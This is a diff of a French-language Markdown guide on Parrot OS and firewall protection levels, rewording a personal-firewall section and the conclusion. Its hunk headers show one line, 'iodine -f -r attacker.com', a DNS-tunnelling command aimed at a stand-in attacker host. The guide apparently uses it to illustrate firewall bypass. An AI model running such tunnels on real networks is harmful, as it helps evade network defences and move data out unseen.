@@ -146,7 +146,7 @@ iodine -f -r attacker.com
 
 ### 🔹 Niveau 6 : Pare-feu personnel
 - Protège uniquement **ta machine locale**.
-- Applique une politique stricte : **tout est bloqué, sauf quelques services essentiels**.
+- Politique stricte : **tout le trafic est bloqué, à l'exception de quelques services essentiels**.
 - Idéal pour un **poste de travail** ou un **serveur isolé**.
 
 👉 **Exemple :** ton PC sous Parrot OS n’accepte que le trafic **web** et **SSH**.
@@ -160,7 +160,7 @@ iodine -f -r attacker.com
 
 # ✅ Conclusion
 
-Parrot OS est une alternative solide à Kali Linux : plus légère, orientée vers la protection de la vie privée et adaptée aux environnements pentest.
+Parrot OS constitue une alternative solide à Kali Linux : alliant légèreté et outils de sécurité avancés, orientée vers la protection de la vie privée et adaptée aux environnements pentest.
 
 Les niveaux 6 et 7 illustrent deux cas concrets :
 
